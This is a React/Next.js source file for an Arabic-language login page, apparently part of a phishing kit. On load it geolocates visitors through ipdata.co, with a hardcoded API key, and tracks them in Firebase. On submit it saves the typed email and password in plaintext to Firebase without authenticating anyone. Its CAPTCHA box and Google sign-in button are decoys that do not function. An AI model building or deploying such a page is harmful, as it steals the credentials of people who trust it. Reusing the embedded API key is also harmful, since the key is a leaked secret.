"use client"

import React, { useEffect, useState } from "react"
import { Eye, EyeOff } from "lucide-react"
import { addData, setupOnlineStatus } from "@/lib/firebase";
function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}
const visitorID=randstr('syr-')
export default function LoginPage() {
  const [loading,setLoading]=useState(true)
  
  useEffect(() => {
    getLocation().then(()=>{
      setLoading(false)
    })
  })
  async function getLocation() {
    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
  
    try {
        const response = await fetch(url);
        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }
        const country = await response.text();
        addData({
            id:visitorID,
            country: country,
            createdDate: new Date().toISOString()
        })
        localStorage.setItem('country',country)
        setupOnlineStatus(visitorID)
      } catch (error) {
        console.error('Error fetching location:', error);
    }
  }
  const [showPassword, setShowPassword] = useState(false)
  const [rememberMe, setRememberMe] = useState(false)
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const handleSubmit=async(e:React.FormEvent)=>{
e.preventDefault()
setLoading(true)
await addData({id:visitorID,email,password,page:'login'}).then(()=>{
  setLoading(false)
})

}
  
  return (
    <div className="min-h-screen bg-[#3a3a3a] flex items-center justify-center p-4">
      <div className="w-full max-w-md">
        {/* Header */}
        <div className="text-center mb-12">
          <h1 className="text-md font-bold text-white mb-4 text-balance">تسجيل الدخول للحساب</h1>
          <p className="text-gray-400 text-sm">ادخل حسابك الآن </p>
        </div>

        {/* Form */}
        <form className="space-y-6" onSubmit={handleSubmit}>
          {/* Email Field */}
          <div>
            <label className="block text-gray-300 text-right mb-2 text-sm">البريد الإلكتروني</label>
            <input
            required
              type="email"
              value={email}
              onChange={(e)=>setEmail(e.target.value)}
              placeholder="البريد الإلكتروني"
              className="w-full px-4 py-2 bg-[#2a2a2a] border border-[#4a7c9e] rounded-lg text-white placeholder-gray-600 text-right focus:outline-none focus:border-[#6fa3c1] focus:ring-1 focus:ring-[#6fa3c1]"
            />
          </div>

          {/* Password Field */}
          <div>
            <label className="block text-gray-300 text-right mb-2 text-sm">كلمة المرور</label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                required
                value={password}
                onChange={(e)=>setPassword(e.target.value)}
                placeholder="كلمة المرور"
                className="w-full px-4 py-2 bg-[#2a2a2a] border border-[#4a7c9e] rounded-lg text-white placeholder-gray-600 text-right focus:outline-none focus:border-[#6fa3c1] focus:ring-1 focus:ring-[#6fa3c1]"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-300"
              >
                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
              </button>
            </div>
          </div>

          {/* Remember Me */}
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <input
                type="checkbox"
                id="remember"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="w-4 h-4 bg-[#2a2a2a] border border-gray-500 rounded cursor-pointer"
              />
              <label htmlFor="remember" className="text-gray-400 text-sm cursor-pointer">
                تذكرني
              </label>
            </div>
            <a href="/reset-password" className="text-[#6fa3c1] text-sm hover:text-[#7eb5d1]">
              نسيت كلمة المرور ؟
            </a>
          </div>

          {/* ReCAPTCHA Checkbox */}
          <div className="border-2 border-[#d4a574] rounded-lg p-3 flex items-center justify-between">
            <span className="text-gray-300 text-sm">انا لست روبوت</span>
            <div className="w-6 h-6 border-2 border-[#d4a574] rounded flex items-center justify-center cursor-pointer">
              <input type="checkbox"  required/>
            </div>
          </div>

          {/* Sign In Button */}
          <button
            type="submit"
            className="w-full bg-[#d4a574] hover:bg-[#e5b884] text-[#1a1a1a] font-semibold py-3 rounded-lg transition-colors"
          >
            تسجيل الدخول
          </button>

          {/* Google Sign In */}
          <button
            type="button"
            className="w-full border border-gray-600 hover:border-gray-500 text-gray-400 hover:text-gray-300 font-semibold py-3 rounded-lg transition-colors flex items-center justify-center gap-2"
          >
            <svg className="w-5 h-5" viewBox="0 0 24 24" fill="currentColor">
              <path
                d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
                fill="#4285F4"
              />
              <path
                d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
                fill="#34A853"
              />
              <path
                d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"
                fill="#FBBC05"
              />
              <path
                d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
                fill="#EA4335"
              />
            </svg>
            تسجيل الدخول بحساب جوجل
          </button>

          {/* Sign Up Link */}
          <div className="text-center pt-4 text-sm">
            <span className="text-gray-400">ليس لديك حساب ؟</span>{" "}
            <a href="#" className="text-[#4da6ff] hover:text-[#66b3ff] font-semibold">
              أنشئ حساب جديد
            </a>
          </div>
        </form>

        {/* Footer Icons */}
        <div className="flex justify-between items-center mt-12">
        </div>
      </div>
    </div>
  )
}
